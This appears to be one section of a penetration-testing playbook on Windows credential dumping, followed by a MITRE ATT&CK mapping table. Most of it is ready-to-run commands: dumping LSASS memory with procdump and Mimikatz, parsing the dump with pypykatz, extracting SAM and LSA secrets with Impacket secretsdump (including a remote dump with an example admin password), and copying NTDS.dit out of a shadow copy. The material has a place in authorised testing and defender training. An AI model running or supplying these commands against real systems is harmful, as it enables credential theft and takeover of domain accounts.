# 🔑 Phase 7: Credential Dumping

Extract credentials from memory, the SAM database, NTDS.dit, and more.

---

## 7.1 LSASS Memory Dump

```bash
# Method 1: Task Manager (GUI) → lsass.exe → Create Dump File

# Method 2: Procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::wdigest

# Parse dump from Kali
python3 pypykatz lsa minidump lsass.dmp
```

---

## 7.2 SAM & LSA Secrets

```bash
# Using Impacket locally
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Remote dump
python3 secretsdump.py corp.local/adm-user:Admin@2024!@192.168.56.10

# Mimikatz SAM dump
lsadump::sam
lsadump::secrets
```

---

## 7.3 NTDS.dit Extraction

```powershell
# Create Volume Shadow Copy
vssadmin create shadow /for=C:\

# Copy NTDS.dit from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

```bash
# Parse NTDS.dit on Kali
python3 secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| OS Credential Dumping: LSASS | T1003.001 | Memory-based extraction |
| OS Credential Dumping: SAM | T1003.002 | Registry credential dump |
| OS Credential Dumping: NTDS | T1003.003 | Domain hash extraction |
